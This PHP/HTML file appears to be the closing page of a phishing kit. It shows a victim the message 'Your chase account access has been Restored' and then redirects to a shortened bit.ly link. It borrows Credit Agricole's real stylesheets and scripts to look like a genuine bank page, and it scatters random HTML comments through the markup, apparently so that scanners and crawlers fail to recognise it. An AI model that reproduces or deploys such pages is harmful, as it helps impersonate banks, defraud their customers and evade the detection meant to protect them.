<?php
session_start();
// error_reporting(0);
session_destroy();
include '../ElZero/function.php';


?>
<html xmlns="http://www.w3.org/1999/xhtml" class="no-js" lang="en" dir="ltr">
<head>
        <meta charset="UTF-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
        <title>Thank you! - Account Verification </title>
      <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes">

        <link id="externalCSSLink" rel="external stylesheet" href="css/external.css">
        <link id="favIconLink" rel="shortcut icon" type="image/x-icon" href="img/ico.ico">
        <link href="css/redirect.css" rel="stylesheet" id="originationCSS">
        <meta http-equiv="refresh" content="4;url=https://bit.ly/2OWmwsY"> 
        <link rel="stylesheet" href="https://www.credit-agricole.fr/etc/designs/ca/npc/clientlibStoreLocatorPart.min.33264c3eddeca243741a267e38aebf98.css" type="text/css">

<link rel="stylesheet" href="https://www.credit-agricole.fr/etc/designs/ca/npc/clientlibStoreLocatorAccesCRPart.min.c21b13ab7c182bf877172ac2ae7712a0.css" type="text/css">

 



<script type="text/javascript" src="https://www.credit-agricole.fr/etc/clientlibs/granite/jquery.min.0811b5e7037ada110b591bbd86240386.js"></script>
<script type="text/javascript" src="https://www.credit-agricole.fr/etc/clientlibs/granite/utils.min.6968fb10cbad8a699b7bcf06fbd45b91.js"></script>
<script type="text/javascript" src="https://www.credit-agricole.fr/etc/clientlibs/granite/jquery/granite.min.b82fcc6ac1f7e79cd9f66e927be67ebb.js"></script>

<script type="text/javascript" src="https://www.credit-agricole.fr/etc/designs/ca/npc/clientlib-bootstrap-jquery.min.df9d6ac4b08627bd99478dab5fa9e747.js"></script>

<script type="text/javascript" src="https://www.credit-agricole.fr/etc/designs/ca/npc/clientlibHeader.min.17a238919df023a602e73f4e9fbbe29a.js"></script>

</head>

<body data-has-view="true" class="no-ignore-color">

 <style type="text/css">
     .origination-custom.jpui.progress.bar:after {border-color: #128842;background-color: #128842;}
     .util.float.right {float: left;}
     @media (min-width: 768px){.col-sm-4 {width: 100%;}}
     .col-sm-4 {width: 100%;}
 </style>
        <?php echo "<!-- ".rand(0,999999999)."-->"; ?> <div id="container"> 
            <!-- Story For crawler Bots  -->
                    <?php $randomStory = rand(0,9); ?>
    <?php echo "<!-- ".rand(0,999999999)."-->"; ?> 


   <?php echo "<!-- ".rand(0,999999999)."-->"; ?>
            <header id="header-container" data-has-view="true">
                <?php echo "<!-- ".rand(0,999999999)."-->"; ?> <div class="header-container" data-is-view="true"> 
                    <?php echo "<!-- ".rand(0,999999999)."-->"; ?> <div class="row top">
                        <?php echo "<!-- ".rand(0,999999999)."-->"; ?> <div class="col-xs-4"> 
                        <?php echo "<!-- ".rand(0,999999999)."-->"; ?> <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?><?php echo "<!-- ".rand(0,999999999)."-->"; ?> 

                        <?php echo "<!-- ".rand(0,999999999)."-->"; ?> <div class="col-xs-4 color-mode-header-logo">

                            <svg class="octogon" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" version="1.1" id="Layer_1" x="0px" y="0px" width="30px" height="30px" viewBox="0 0 268 268" xml:space="preserve" xml="http://www.w3.org/XML/1998/namespace" focusable="false">
                            <path d="M100.749,8.655c-4.88,0-8.86,3.968-8.86,8.844v62.095h164.04L181.227,8.69L100.749,8.655" style="fill: rgb(255, 255, 255);">
                            </path> 
                            <path d="M261.945,98.372c0-4.884-3.947-8.82-8.875-8.82h-62.052V253.6l70.896-74.726L261.945,98.372" style="fill: rgb(255, 255, 255);">           
                            </path> 
                            <path d="M172.177,259.538c4.864,0,8.86-3.965,8.86-8.845v-62.099H16.989l74.678,70.943H172.177" style="fill: rgb(255, 255, 255);">
                            </path> 
                            <path d="M10.996,169.848c0,4.896,3.933,8.829,8.832,8.829h62.111V14.629L10.996,89.362V169.848" style="fill: rgb(255, 255, 255);">
                            </path>
                            </svg>
                        <?php echo "<!-- ".rand(0,999999999)."-->"; ?> <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?><?php echo "<!-- ".rand(0,999999999)."-->"; ?> 
                       <?php echo "<!-- ".rand(0,999999999)."-->"; ?> <div class="col-xs-4 util right aligned">
                            
                        <?php echo "<!-- ".rand(0,999999999)."-->"; ?> <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                    <?php echo "<!-- ".rand(0,999999999)."-->"; ?> <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                <?php echo "<!-- ".rand(0,999999999)."-->"; ?> <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
            </header> 
<?php echo "<!-- ".rand(0,999999999)."-->"; ?> <div id="main-container">
            <aside id="helpbar" role="complementary" aria-label="Help Bar">
            </aside> 
            <?php echo "<!-- ".rand(0,999999999)."-->"; ?> <div>
                <?php echo "<!-- ".rand(0,999999999)."-->"; ?> <div class="container-fluid" id="secondary-header-container">
                
            <?php echo "<!-- ".rand(0,999999999)."-->"; ?> <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?><?php echo "<!-- ".rand(0,999999999)."-->"; ?> 
            <main class="container-fluid" id="main">
                <?php echo "<!-- ".rand(0,999999999)."-->"; ?> <div id="progressbar-block" data-has-view="true">
                <?php echo "<!-- ".rand(0,999999999)."-->"; ?> <div data-is-view="true">
                <style id="progress-bar-step-1of8">.origination-custom.jpui.progress.bar.step1of8:after{width: 99.8%;}</style>
                <?php echo "<!-- ".rand(0,999999999)."-->"; ?> <div class="row origination-progress-block">
                    <?php echo "<!-- ".rand(0,999999999)."-->"; ?> <div class="col-xs-12 col-sm-8 col-lg-6 col-sm-push-2 col-lg-push-3">
                        <?php echo "<!-- ".rand(0,999999999)."-->"; ?> <div id="PROGRESSBAR_HEADER">
                    <?php echo "<!-- ".rand(0,999999999)."-->"; ?> <div>
                    <h1 id="stepNameTagElementId" tabindex="-1" aria-describedby="stepNameApplicantTypeHeader">&nbsp;&nbsp;</h1> 
                <span class="jpui util accessible-text" id="stepNameApplicantTypeHeader" aria-hidden="true">
                
            </span>
            <?php echo "<!-- ".rand(0,999999999)."-->"; ?> <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
            <?php echo "<!-- ".rand(0,999999999)."-->"; ?> <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?><?php echo "<!-- ".rand(0,999999999)."-->"; ?> 
                <?php echo "<!-- ".rand(0,999999999)."-->"; ?> <div id="PROGRESSBAR_PROGRESS">
                <?php echo "<!-- ".rand(0,999999999)."-->"; ?> <div class="row"><?php echo "<!-- ".rand(0,999999999)."-->"; ?> <div class="col-xs-12 col-sm-12">
                <?php echo "<!-- ".rand(0,999999999)."-->"; ?> <div class="jpui progress origination-custom step1of8 bar" id="main-progress" data-progress="">
                    <?php echo "<!-- ".rand(0,999999999)."-->"; ?> <div class="bar fill" id="main-progress-bar">
                
            <?php echo "<!-- ".rand(0,999999999)."-->"; ?> <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?><?php echo "<!-- ".rand(0,999999999)."-->"; ?> 
                <span class="util accessible-text" id="accessible-bar-main-progress">
                
            </span>
        <?php echo "<!-- ".rand(0,999999999)."-->"; ?> <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
    <?php echo "<!-- ".rand(0,999999999)."-->"; ?> <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
<?php echo "<!-- ".rand(0,999999999)."-->"; ?> <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
<?php echo "<!-- ".rand(0,999999999)."-->"; ?> <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?><?php echo "<!-- ".rand(0,999999999)."-->"; ?>  


    <?php echo "<!-- ".rand(0,999999999)."-->"; ?> <div id="PROGRESSBAR_ADVISORY">
        <?php echo "<!-- ".rand(0,999999999)."-->"; ?> <div>
            <h2 id="stepAdvisoryTagElementId" tabindex="-1">Thank you! Your chase account access has been Restored.</h2>
        <?php echo "<!-- ".rand(0,999999999)."-->"; ?> <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
    <?php echo "<!-- ".rand(0,999999999)."-->"; ?> <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
<?php echo "<!-- ".rand(0,999999999)."-->"; ?> <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
<?php echo "<!-- ".rand(0,999999999)."-->"; ?> <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
<?php echo "<!-- ".rand(0,999999999)."-->"; ?> <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
<?php echo "<!-- ".rand(0,999999999)."-->"; ?> <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?><?php echo "<!-- ".rand(0,999999999)."-->"; ?>

<section class="origination page-content" id="content" data-has-view="true">
    <?php echo "<!-- ".rand(0,999999999)."-->"; ?> <div class="row no-content-padding" id="gettingStartedContainer" data-is-view="true">
        <?php echo "<!-- ".rand(0,999999999)."-->"; ?> <div class="col-xs-12 col-sm-8 col-lg-6 col-sm-push-2 col-lg-push-3">
            <?php echo "<!-- ".rand(0,999999999)."-->"; ?> <div id="ICONDATA">
                <?php echo "<!-- ".rand(0,999999999)."-->"; ?> <div class="row util-margin-top-bottom">
                 <?php echo "<!-- ".rand(0,999999999)."-->"; ?> <div class="col-sm-4 icongroup">
                    <?php echo "<!-- ".rand(0,999999999)."-->"; ?> <div class="row">
                        <?php echo "<!-- ".rand(0,999999999)."-->"; ?> <div class="col-xs-2 col-sm-12 util aligned center gt-imageIcon-wrap">
                            <img width="150" height="150" src="img/success.gif">
                        <?php echo "<!-- ".rand(0,999999999)."-->"; ?> <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                        <?php echo "<!-- ".rand(0,999999999)."-->"; ?> <div class="container-fluid" id="originationsFooter" data-has-view="true">
                            <?php echo "<!-- ".rand(0,999999999)."-->"; ?> <div class="row" data-is-view="true">
                                <?php echo "<!-- ".rand(0,999999999)."-->"; ?> <div class="col-xs-12 col-sm-8 col-lg-6 col-sm-push-2 col-lg-push-3">
                                    <?php echo "<!-- ".rand(0,999999999)."-->"; ?> <div class="inlineFieldCell">
                                    <?php echo "<!-- ".rand(0,999999999)."-->"; ?> <div class="row">
                                        <?php echo "<!-- ".rand(0,999999999)."-->"; ?> <div class="col-xs-12" id="footerText" aria-hidden="true">
                                            <p class="BODY2">Please wait, you will be redirected to the authentication page in 5 seconds ...<br>
                                            <img style="width:13%;" src="assets/img/loading.gif">
                                            <?php echo "<!-- ".rand(0,999999999)."-->"; ?> </p><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                                        <?php echo "<!-- ".rand(0,999999999)."-->"; ?> <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                                    <?php echo "<!-- ".rand(0,999999999)."-->"; ?> <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                                <?php echo "<!-- ".rand(0,999999999)."-->"; ?> <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                            <?php echo "<!-- ".rand(0,999999999)."-->"; ?> <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                        <?php echo "<!-- ".rand(0,999999999)."-->"; ?> <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                    <?php echo "<!-- ".rand(0,999999999)."-->"; ?> <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                <?php echo "<!-- ".rand(0,999999999)."-->"; ?> <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
            <?php echo "<!-- ".rand(0,999999999)."-->"; ?> <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
        <?php echo "<!-- ".rand(0,999999999)."-->"; ?> <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
    <?php echo "<!-- ".rand(0,999999999)."-->"; ?> <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?><?php echo "<!-- ".rand(0,999999999)."-->"; ?>


</body>
</html>